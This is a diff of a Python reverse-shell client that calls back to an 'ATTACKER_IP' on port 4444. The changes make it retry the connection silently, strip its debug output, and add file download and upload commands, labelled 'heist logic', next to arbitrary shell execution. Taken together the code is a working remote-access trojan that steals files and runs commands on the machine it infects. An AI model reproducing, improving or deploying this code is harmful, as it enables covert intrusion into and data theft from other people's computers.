@@ -3,61 +3,85 @@ import os
 import subprocess
 
 # --- CONFIGURATION ---
-# In a real attack, this is your Public IP (or Ngrok).
-# For testing, use localhost or your local LAN IP (e.g., 192.168.1.X)
-ATTACKER_IP = "192.168.56.1" 
+ATTACKER_IP = "127.0.0.1" # Change this for real attacks
 PORT = 4444
+
+def send_file(sock, filename):
+    if os.path.exists(filename):
+        filesize = os.path.getsize(filename)
+        sock.send(f"EXISTS {filesize}".encode())
+        
+        # Wait for Server to say OK
+        sock.recv(1024) 
+        
+        with open(filename, "rb") as f:
+            while True:
+                chunk = f.read(4096)
+                if not chunk: break
+                sock.send(chunk)
+    else:
+        sock.send("ERROR: File not found".encode())
+
+def receive_file(sock, command):
+    # Command format from server: "UPLOAD filename filesize"
+    _, filename, filesize = command.split()
+    filesize = int(filesize)
+    
+    sock.send("OK".encode()) # Tell server we are ready
+    
+    with open(filename, "wb") as f:
+        total_recv = 0
+        while total_recv < filesize:
+            data = sock.recv(4096)
+            if not data: break
+            f.write(data)
+            total_recv += len(data)
+            
+    sock.send("[+] Upload Successful".encode())
 
 def connect():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    print(f"[*] Trying to connect to {ATTACKER_IP}:{PORT}...") # DEBUG
-    
-    try:
-        s.connect((ATTACKER_IP, PORT))
-        print("[+] Connected to Server!") # DEBUG
-    except Exception as e:
-        print(f"[-] Connection Failed: {e}") # THIS WILL TELL YOU THE PROBLEM
-        return
+    while True:
+        try:
+            s.connect((ATTACKER_IP, PORT))
+            break
+        except:
+            pass # Keep trying silently
 
     while True:
-        # 1. Receive Command
         try:
             command = s.recv(1024).decode()
             
             if command.lower() == 'exit':
                 break
             
-            # 2. Handle 'cd' (Directory Navigation)
-            if command.startswith('cd '):
+            # --- HEIST LOGIC ---
+            if command.startswith("download "):
+                filename = command.split()[1]
+                send_file(s, filename)
+                
+            elif command.startswith("UPLOAD "): # Note: Case sensitive check from our protocol
+                receive_file(s, command)
+                
+            # --- NAVIGATION LOGIC ---
+            elif command.startswith('cd '):
                 try:
-                    # Extract path "cd /users/..."
-                    target_dir = command[3:].strip()
-                    os.chdir(target_dir) # Actually change directory
+                    os.chdir(command[3:].strip())
                     s.send(f"[+] Changed to: {os.getcwd()}".encode())
                 except Exception as e:
                     s.send(str(e).encode())
-                    
-            # 3. Handle General Commands
+
+            # --- SHELL LOGIC ---
             else:
-                # Execute command in shell
                 proc = subprocess.Popen(command, shell=True, 
                                       stdout=subprocess.PIPE, 
                                       stderr=subprocess.PIPE, 
                                       stdin=subprocess.PIPE)
-                
-                # Read output
                 output = proc.stdout.read() + proc.stderr.read()
+                s.send(output if output else b"[+] Executed")
                 
-                # Send back to attacker (if empty, send confirmation)
-                if not output:
-                    output = b"[+] Command Executed (No Output)"
-                    
-                s.send(output)
-                
-        except Exception as e:
+        except:
             break
-
     s.close()
 
 if __name__ == "__main__":
